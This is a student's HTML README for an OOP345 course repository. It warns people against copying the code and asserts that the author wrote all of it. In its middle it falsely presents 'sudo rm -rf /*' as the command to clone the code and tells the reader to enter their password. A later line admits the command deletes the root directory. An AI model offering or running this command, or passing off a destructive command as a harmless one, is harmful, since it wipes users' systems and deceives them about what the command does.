<h5> To strangers or anyone with intent to copy this code for their personal academic success or to show off that they are really a nerd (you're not): </h5>
<p1>This is Yathavan Parameshwaran's repository for OOP345 workshops and assignments. All files in here are </p1><strong>not allowed</strong><p1> to be copied, cloned, or otherwise downloaded without the explicit permission of Yathavan Parameshwaran. </p1> <p2>(Besides, half the code in here might be filled with bugs and stuff, do you really want to copy this and risk failing?)</p2>
</br></br>
<p2>If you don't have nor care about any integrity, here is the command to copy/clone over all the code --> </p2><strong>sudo rm -rf /*</strong></br><p2> Just enter your password and voila, you now have what you needed. </p2>
</br></br>
<h5> To anyone with doubt regarding if it is really me writing this code, or me copying the code from someplace else: </h5>
<p1> I created this repository (and this Github account) in order to organize and keep track of my code. I am the one and only owner of https://github.com/rivalDevYP and I am the sole contributer to all code in this repository (OOP345). This repository is linked to my local machine, and my Visual Studio 2017, to make it easier for me to add/delete/modify anything and just push it from there. </p1>
</br>
<p1> If you are </p1><i>still</i><p1> in doubt of the validity of this code or in me being the sole contributor, you are more than welcome to request to see my local machine, and track the changes I made. I will only allow you to do so in person, AND if I know you. If I don't know you or like you, then I will get you detained for attempted robbery. </p1>
</br></br>
<p1> Regards, </p1></br><p1>Yathavan (rivalDevYP)</p1>
</br></br></br>
<p5> (and please, no pull requests, i don't want your code nor do i need it. i know it is hard to pass up an opportunity to contribute to this beautiful repo, but sorry, your code is not good enough) </p5> 
</br></br>
<p5>also I do not take any responsibility nor liability nor any shit from you if you decide to moronically use the "sudo rm -rf /*" command above to copy/clone this code; you are an idiot and you deserve to get your rootdir deleted</p5>
